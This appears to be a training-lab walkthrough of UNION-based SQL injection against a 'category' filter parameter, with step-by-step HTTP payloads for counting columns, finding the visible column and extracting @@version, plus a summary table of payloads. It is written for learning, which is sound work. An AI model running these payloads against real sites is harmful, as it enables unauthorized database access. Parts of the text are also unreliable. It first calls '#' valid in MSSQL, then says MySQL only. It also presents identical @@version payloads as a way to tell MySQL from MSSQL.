# 🛠️ SQL Injection Walkthrough: Querying Database Type & Version on MySQL and Microsoft  
## 🔍 Step-by-Step Guide to Solving the Lab  

## 🎯 Objective

**To exploit a SQL injection vulnerability in the product category filter and display the database version string.**

This lab simulates a vulnerable web application where:
- The backend uses either **MySQL** or **Microsoft SQL Server (MSSQL)**.
- Standard SQL injection payloads like `' ORDER BY 1--` may fail due to **comment filtering**, but alternatives like `#` (URL-encoded as `%23`) work.

## 🧪 Lab Overview

You're targeting a URL parameter that filters products by category:

```
GET /filter?category=<INJECT_HERE>
```

Through this walkthrough, you'll learn how to:
- Identify SQL injection vulnerability
- Bypass comment filtering using `#` instead of `--`
- Enumerate column count
- Inject payloads to retrieve database version
- Adapt your approach based on DBMS behavior

## 🧭 Step-by-Step Walkthrough

### 🔹 Step 1: Confirm SQL Injection Vulnerability

Start by testing if the input is injectable.

```http
GET /filter?category='
```

✅ If it breaks the query or shows an error → SQL injection point exists.

### 🔹 Step 2: Determine Number of Columns Using `ORDER BY`

Try using `ORDER BY` to guess how many columns are returned.

#### ❌ This fails:
```http
GET /filter?category='+ORDER+BY+1--
```

❌ No result or error occurs → Likely because the backend **filters or blocks `--` comments**.

#### ✅ This works:
```http
GET /filter?category='+ORDER+BY+1%23 
```

> `%23` is the URL-encoded representation of `#`, which is also a valid comment in MySQL and MSSQL.

Now test for column count:

```http
GET /filter?category='+ORDER+BY+1%23   → ✅ Works  
GET /filter?category='+ORDER+BY+2%23   → ✅ Works  
GET /filter?category='+ORDER+BY+3%23   → ❌ Fails  
```

✅ Confirmed: There are **2 columns**.

### 🔹 Step 3: Use `UNION SELECT` to Inject Data

Now try injecting data using `UNION SELECT`.

```http
GET /filter?category='+UNION+SELECT+NULL,NULL%23
```

✅ If page loads normally → Payload executed successfully.

### 🔹 Step 4: Find Which Column Displays Text

Test which of the two columns displays text:

```http
GET /filter?category='+UNION+SELECT+'a',NULL%23   → ❌ No output  
GET /filter?category='+UNION+SELECT+NULL,'a'%23   → ✅ Output shown  
```

✅ Confirmed: Only the **second column** is visible.

So, all useful injected data must be placed in the **second column**.

### 🔹 Step 5: Try to Identify the Database Type

Try injecting DB-specific syntax to determine whether it's **MySQL** or **MSSQL**.

#### 🟡 Try MySQL version syntax:
```http
GET /filter?category='+UNION+SELECT+NULL,@@version%23
```

✅ If this returns something like:
```
5.7.26-0ubuntu0.18.04.1-log
```
→ You're dealing with **MySQL**.

#### 🟡 Try MSSQL version syntax:
```http
GET /filter?category='+UNION+SELECT+NULL,@@VERSION%23
```

✅ If this returns something like:
```
Microsoft SQL Server 2019 - 15.0.2000.5
```
→ You're dealing with **MSSQL**.

### 🔹 Step 6: Display Database Version String

Once you’ve identified the DBMS, use the appropriate payload to show the version.

#### ✅ For MySQL:
```http
GET /filter?category='+UNION+SELECT+NULL,@@version%23
```

#### ✅ For MSSQL:
```http
GET /filter?category='+UNION+SELECT+NULL,@@VERSION%23
```

✅ Success! You've retrieved the database version — Lab complete.

## 📋 Summary of Payloads Used

| Goal | Payload |
|------|---------|
| Confirm vuln | `'` |
| Check column count | `' ORDER BY 1%23` through `' ORDER BY 3%23` |
| UNION select test | `' UNION SELECT NULL,NULL%23` |
| Identify visible column | `' UNION SELECT NULL,'a'%23` |
| Get DB version (MySQL) | `' UNION SELECT NULL,@@version%23` |
| Get DB version (MSSQL) | `' UNION SELECT NULL,@@VERSION%23` |

## 🧠 Why Did `--` Fail But `#` Work?

In SQL, both `--` and `#` are valid comment indicators — **but only in certain databases**:

| Comment Style | Supported By | Notes |
|---------------|--------------|-------|
| `--`          | MySQL, MSSQL, PostgreSQL | Requires space after `--` in some cases |
| `#`           | MySQL only   | Not supported by MSSQL or PostgreSQL |

In this lab:
- `--` was likely filtered or sanitized by the backend.
- `#` worked because the backend used **MySQL**, which supports it.
- We used `%23` (URL-encoded `#`) to bypass filters.

Happy hacking! 🔥🕵️‍♂️🛡️
